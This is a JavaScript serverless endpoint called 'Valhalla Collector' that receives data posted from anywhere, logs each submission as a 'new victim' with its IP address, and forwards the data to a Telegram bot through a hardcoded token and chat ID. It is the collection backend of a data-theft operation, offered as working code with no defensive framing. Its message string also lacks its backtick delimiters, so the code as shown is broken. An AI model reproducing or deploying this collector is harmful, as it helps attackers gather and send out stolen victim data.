export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'GET') {
    return res.status(200).json({
      status: 'online',
      endpoint: 'Valhalla Collector',
      message: 'Ready to receive data'
    });
  }
  
  if (req.method === 'POST') {
    try {
      const data = req.body;
      const timestamp = new Date().toISOString();
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      
      console.log('NEW VICTIM DETECTED');
      console.log('Time:', timestamp);
      console.log('IP:', ip);
      console.log('Data:', JSON.stringify(data, null, 2));
      
      const TELEGRAM_TOKEN = '8066658599:AAG8pw3dZwNs9t7S-VM88CmHP0fr8E9uYOY';
      const CHAT_ID = '7724882933';
      
      if (TELEGRAM_TOKEN) {
        try {
          const message = 🎯 *Valhalla - New Victim*\n\n +
                         ⏰ Time: \`${timestamp}\`\n +
                         🌐 IP: \`${ip}\`\n\n +
                         📦 Data:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`;
          
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: 'Markdown'
            })
          });
        } catch (telegramError) {
          console.error('Telegram Error:', telegramError);
        }
      }
      
      return res.status(200).json({
        ok: true,
        received: timestamp,
        id: Math.random().toString(36).substring(7)
      });
      
    } catch (error) {
      console.error('Error:', error);
      return res.status(200).json({ok: true});
    }
  }
  
  return res.status(405).json({error: 'Method not allowed'});
}
